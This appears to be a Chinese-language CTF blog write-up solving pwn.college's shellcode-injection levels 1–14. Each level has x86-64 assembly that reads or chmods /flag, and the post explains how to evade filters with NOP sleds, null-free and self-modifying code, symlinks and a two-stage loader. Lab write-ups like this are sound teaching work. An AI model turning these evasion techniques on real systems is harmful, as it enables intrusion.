---
title: PwnCollege baby shell writeup
date: 2023-02-25 15:03:14
tags: [CTF, shell injection]
category: [CTF]
---

偶然间了解到了[pwn.college](https://pwn.college)的存在, 有比较详细的PreReading和教程视频并且平台交互比较友好, 可以在网页中用vs code的terminal完成所有的操作, 比较方便, 于是就开始了CTF get start :). 我是从x86 assembly的那个module开始的, 因为是比较简单汇编语法, 这里就不赘述了, 就从shell injection开始吧.

shell injection的challenge在`/challenge/`目录下, 运行之后会显示当前level的challenge.

Tips:
1. 在shellcode中用`.intel_syntax noprefix` 可以代替gcc中的`-masm=intel`
2. 用`objcopy --dump-section .text=<output> <excutable>`dump出text section

## level 1, 2
level 1和level 2比较简单, 可以采用多种方式拿到flag. 可以读`/flag`文件, 然后输出到`/dev/stdout`. 或者直接调用`chmod`修改`/flag`文件的权限. 我这里用的是第一种方法.

第一个syscall是`open('/flag', 0, 0)`, 然后将fd作为第二个syscall`sendfile`的参数, 将`/flag`的内容发送给`/dev/stdout`, 也就是直接输出出来.
>*This challenge will randomly skip up to 0x800 bytes in your shellcode*

level 2 与level 1不同的就是level 2会随机跳过最多0x800 bytes的code, 在最开始用`nop(0x90)`填充0x800 bytes即可.
```
.global _start
_start:
.intel_syntax noprefix
.fill 0x800, 1, 0x90
        mov rax, 0x67616c662f
        mov [rdi], rax
        mov rsi, 0
        mov rdx, 0
        mov rax, 2
        syscall

        mov rdi, 1
        mov rsi, rax
        mov rax, 40
        mov rdx, 0
        mov r10, 0x100
        syscall

        mov rax, 60
        mov rdi, 0
        syscall
```
## level 3, 4
>*Level 3: This challenge requires that your shellcode have no NULL bytes!*
>*Level 4: This challenge requires that your shellcode have no H bytes!*

level 3和level 4是同类型的, level 3要求编译好的shellcode里不能包含`NULL(0x00)`byte, level 4是要求不能包含 `H(0x48)`byte.
shellcode中包含0x00 byte大部分情况是因为操作数中含有至少1byte的0, 比如`mov rax, 0x123`, 编译后0x123会被填充成`0x00,00,00,00,00,00,01,23`. 如果要去除shellcode中的0x00, 可以对shellcode进行修改, 转换成等价的其他语句. 比如
```
mov rax, 0 -> xor rax, rax
mov rax, 0x10 -> mov al, 0x10
mov rax, 1 -> inc rax
...
```
level 4的要求是不能包含`H(0x48)`byte, shellcode中出现H byte是因为x86_64为了兼容x86汇编添加的一个标识位, x86的shellcode一样可以在x86_64下运行, 所以只需要将shellcode中的64位寄存器换成32位寄存器就可以通过level 4了.
level 3 code:
```
.global _start
_start:
.intel_syntax noprefix
        xor rax, rax
        mov al, 0x67
        shl rax, 0x08
        mov al, 0x61
        shl rax, 0x08
        mov al, 0x6c
        shl rax, 0x08
        mov al, 0x66
        shl rax, 0x08
        mov al, 0x2f
        mov [rdi], rax
        xor rsi, rsi
        xor rdx, rdx
        xor rax, rax
        inc rax
        inc rax
        syscall

        xor rdi,rdi
        inc rdi
        mov rsi, rax
        xor rax, rax
        mov al, 40
        xor rdx, rdx
        xor r10, r10
        inc r10
        shl r10, 16
        syscall

        xor rax, rax
        mov al, 60
        xor rdi, rdi
        syscall
```
level 4 code:
```
.global _start
_start:
.intel_syntax noprefix
        lea eax, [eip + m]
        mov edi, eax
        mov esi, 0
        mov edx, 0
        mov eax, 2
        syscall

        mov edi, 1
        mov esi, eax
        mov eax, 40
        mov edx, 0
        mov r10, 0x100
        syscall

        mov eax, 60
        mov edi, 0
        syscall
m:
        .string "/flag"
```

## level 5, 6
>*This challenge requires that your shellcode does not have any `syscall`, `sysenter`, or `int` instructions. System calls are too dangerous! This filter works by scanning through the shellcode for the following byte sequences: 0f05 (`syscall`), 0f34 (`sysenter`), and 80cd (`int`). One way to evade this is to have your shellcode modify itself to insert the `syscall` instructions at runtime.*

level 5会过滤shellcode中的syscall, sysenter, int等命令阻止你调用API. 因为内存是可写的, 所以绕过这种过滤的办法就是通过`rip`计算出偏移, 然后对shellcode进行动态修改将下一条要执行的指令修改成`syscall`, `syscall`的op code是`0f05`, 我这里选择的是`clts`命令, 它的op code是`0f06`, 只要将第二个byte减一就可以将它变成`syscall`.

level 6的话是会移除shellcode前`4096(0x1000)`byte的写权限, 只要用nop填充一下就可以了.
```
.global _start
_start:
.intel_syntax noprefix
        mov rax, 0x67616c662f
        mov [rdi], rax
        mov rsi, 0
        mov rdx, 0
        mov rax, 2
        dec byte ptr [rip + 1]
        clts

        mov rdi, 1
        mov rsi, rax
        mov rax, 40
        mov rdx, 0
        mov r10, 0x100
        dec byte ptr [rip + 1]
        clts

        mov rax, 60
        mov rdi, 0
        dec byte ptr [rip + 1]
        clts
```

## level 7
level 7是将`/dev/stdin`, `/dev/stdout`, `/dev/stderr`都关闭了, 这样就无法通过标准输出获取flag, 不过仍然有好多种方式, 第一种是读`/flag`文件, 然后写到其他文件里去, 第二种就是直接call`chmod`, 修改`/flag`文件的权限.

我这里用的是第一种方式. 需要注意的是, `open`的CPP doc中的`flag`和`mode`参数都是八进制的, 不是十进制.
```
.global _start
_start:
.intel_syntax noprefix
        lea eax, [eip + m]
        mov edi, eax
        mov esi, 0
        mov edx, 0
        mov eax, 2
        syscall
        mov ebx, eax

        lea eax, [eip + o]
        mov edi, eax
        mov esi, 65
        mov edx, 511
        mov eax, 2
        syscall

        mov edi, eax
        mov esi, ebx
        mov eax, 40
        mov edx, 0
        mov r10, 0x100
        syscall

        mov eax, 3
        syscall

        mov eax, 60
        mov edi, 0
        syscall
m:
        .string "/flag"
o:
        .string "/home/hacker/key"
```
## level 8, 13, 14
>*Reading 0x12 bytes from stdin*
>*Reading 0xC bytes from stdin*
>*Reading 0x6 bytes from stdin*

level 8, 13, 14这三个都是对shellcode的长度做了限制, 而且越来越短. 为了能让shellcode尽可能的短, 那我们就要减少syscall的数量, 同时保证用到的op code尽量的短.

这里我选择了调用`chmod`, 它只需要3个参数: `rax`syscall id, `rsi`保存指向filename的地址, `rdi`是要设置的权限. 但是文件名`/flag`需要5个byte, 再加上字符串结尾的`0x00`byte, 就占掉了6byte, 剩下的`mov si, 0x4; mov al, 0x5a; syscall`至少需要8byte, 看起来只能通过level 8 0x12byte的限制.

这里就需要用到一个chmod的一个feature, chmod不会改变symbolic links文件本身的权限, 而是改变它指向的文件的权限.
>*chmod never changes the permissions of symbolic links; the chmod system call cannot change their permissions. This is not a problem since the permissions of symbolic links are never used. However, for each symbolic link listed on the command line, chmod changes the permissions of the pointed-to file. In contrast, chmod ignores symbolic links encountered during recursive directory traversals.*

利用这个特性, 就可以创建一个指向`/flag`文件的symbolic links, 它的名字长度就是可控的了. 我创建了一个叫`F`的链接文件来指向`/flag`
```
ln -s /flag F
```

那文件名就是`0x46, 0x00`, 利用小端存储的特性, 只需要将`0x46`push到栈中即可, 它的高位会被自动填充成0. 同时`push 0x46`命令只占2bytes.
```
.global _start
_start:
.intel_syntax noprefix
        push 0x46
        mov rdi, rsp
        mov si,4
        mov al, 90
        syscall
```

```
0000000000401000 <_start>:
  401000:       6a 46                   push   0x46
  401002:       48 89 e7                mov    rdi,rsp
  401005:       66 be 04 00             mov    si,0x4
  401009:       b0 5a                   mov    al,0x5a
  40100b:       0f 05                   syscall 
```
但是这样编译出来的shellcode的长度是13, 只能通过level 8 和 level 13, 对于level 14的6byte看起来是个不可能的任务, 但level 14与前面两个level的不同就是level 14对于shellcode没有写权限的控制, 那么我们其实可以通过两段式来注入shellcode.

两段式注入第一段是调用`read`, 从`/dev/stdin`中读取第二段shellcode, 写入到`rip`指向的地址, 从而让第二段shellcode能够执行.

所以需要在第一段中调用`read` syscall, 其中`syscall(0f05)`占2byte, 只剩4byte留给其他的操作. 这里没有好的思路, 就gdb来调试下level 14的可执行文件.

```
0x0000558881446733 <+460>:   mov    0x28e6(%rip),%rax        # 0x558881449020 <shellcode_mem>
0x000055888144673a <+467>:   mov    $0x6,%edx
0x000055888144673f <+472>:   mov    %rax,%rsi
0x0000558881446742 <+475>:   mov    $0x0,%edi
0x0000558881446747 <+480>:   callq  0x5588814461a0 <read@plt>
0x000055888144674c <+485>:   mov    %rax,0x28c5(%rip)        # 0x558881449018 <shellcode_size>
0x0000558881446753 <+492>:   mov    0x28be(%rip),%rax        # 0x558881449018 <shellcode_size>
0x000055888144675a <+499>:   test   %rax,%rax
0x000055888144675d <+502>:   jne    0x55888144677e <main+535>
0x000055888144675f <+504>:   lea    0xd46(%rip),%rcx        # 0x5588814474ac <__PRETTY_FUNCTION__.14866>
0x0000558881446766 <+511>:   mov    $0x55,%edx
0x000055888144676b <+516>:   lea    0xa53(%rip),%rsi        # 0x5588814471c5
0x0000558881446772 <+523>:   lea    0xcc6(%rip),%rdi        # 0x55888144743f
0x0000558881446779 <+530>:   callq  0x558881446170 <__assert_fail@plt>
0x000055888144677e <+535>:   lea    0xcd3(%rip),%rdi        # 0x558881447458
0x0000558881446785 <+542>:   callq  0x558881446120 <puts@plt>
0x000055888144678a <+547>:   mov    0x2887(%rip),%rdx        # 0x558881449018 <shellcode_size>
0x0000558881446791 <+554>:   mov    0x2888(%rip),%rax        # 0x558881449020 <shellcode_mem>
0x0000558881446798 <+561>:   mov    %rdx,%rsi
0x000055888144679b <+564>:   mov    %rax,%rdi
0x000055888144679e <+567>:   callq  0x5588814462c9 <print_disassembly>
0x00005588814467a3 <+572>:   lea    0xceb(%rip),%rdi        # 0x558881447495
0x00005588814467aa <+579>:   callq  0x558881446120 <puts@plt>
0x00005588814467af <+584>:   lea    0xce0(%rip),%rdi        # 0x558881447496
0x00005588814467b6 <+591>:   callq  0x558881446120 <puts@plt>
0x00005588814467bb <+596>:   mov    0x285e(%rip),%rax        # 0x558881449020 <shellcode_mem>
0x00005588814467c2 <+603>:   mov    %rax,%rdx
0x00005588814467c5 <+606>:   mov    $0x0,%eax
0x00005588814467ca <+611>:   callq  *%rdx
0x00005588814467cc <+613>:   mov    $0x0,%eax
0x00005588814467d1 <+618>:   leaveq 
0x00005588814467d2 <+619>:   retq 
```
这里找到了程序执行`read`的操作, 这里就是将shellcode从stdin读入了, `edi`保存的是`read`的`fd(file descriptor)`参数, 0x0就是`/dev/stdin`. 然后`edx`保存的是`count`参数. 然后`rsi`保存的是读取的code保存的地址, 它的值为`rip + 0x28e6`.

继续往下看, 到`0x00005588814467ca <+611>`的位置, 发现call了`rdx`指向的内存, 从上面可以发现它的值是`rip + 0x285e`, 两个offset的差值是`0x28e6 - 0x285e = 0x88 (136)`, 而`0x0000558881446733 <+460>`到`0x00005588814467bb <+596>`的offset也是`136`, 那说明这里call的就是读入进来的shellcode, 可以看到在call之前已经执行了`mov $0x0,%eax`, 而这恰好就是`read`syscall的id, 那这就替一段的shell减少了一条语句, 然后就需要关注剩余的参数`rdi(fd)` `rsi(buf addr)` `rdx(size)`.

`rdi`需要设置为0, 即`/dev/stdin`的file descriptor值.

`rsi`需要设置为`rip`的地址, 如果使用`mov rsi, [rip]`或者`lea rsi, [rip]`的话, 编译出来的长度都不满足要求. 通过反编译出来的代码可以发现, `rdx`的值已经是第一段shellcode所在的地址了, 所以将`rsi`赋值为`rdx`的值再加上shellcode的长度即可, 但是会发现赋值之后再加编译出来的shellcode长度无法达到6byte的长度, **那可以选择在第二段shellcode的开头填充6byte的`nop`.**
`rdx`作为表示长度的参数, 它的值是一个内存地址, 保持它的值不变即可.
```
.global _start
_start:
.intel_syntax noprefix
        push rdx
        pop rsi
        xor rdi, rdi
        syscall
```
## level 9
>*This challenge modified your shellcode by overwriting every other 10 bytes with 0xcc. 0xcc, when interpreted as an instruction is an `INT 3`, which is an interrupt to call into the debugger. You must avoid these modifications in your shellcode.*

level 9会修改你的shellcode, 每隔10 byte将shellcode set成0xcc, 也就是`INT 3`, 要跳过中断的话用`jmp`即可, 中间可以填充`nop`或者其他byte. 然后尽量保证shellcode的长度在20 byte以内, 这样jmp之后在被set 0xcc之前就可执行结束.
```
.global _start
_start:
.intel_syntax noprefix
        push 0x46
        mov rdi, rsp
        mov al, 90
        jmp next
.fill 10, 1, 0x90
next:
        mov si,4
        syscall
```

## level 10, 11
>*This challenge just sorted your shellcode using bubblesort. Keep in mind the impact of memory endianness on this sort (e.g., the LSB being the right-most byte). This sort processed your shellcode 8 bytes at a time.*

level 10会将shellcode按照8byte为一组, 按组进行排序. 根据编译出来的hex code对asm语句顺序进行调整即可
```
.global _start
_start:
.intel_syntax noprefix
        push 0x46
        mov rdi, rsp
        mov al, 90
        mov si,4
        syscall
```
level 11在level 10的基础上关闭了`/dev/stdin`, 但是对于chmod来说没有影响, 用level 10的code同样可以pass.

## level 12
>*This challenge requires that every byte in your shellcode is unique!*

level 12的要求是shellcode中不能有重复的byte, level 10的code同样可以满足 :).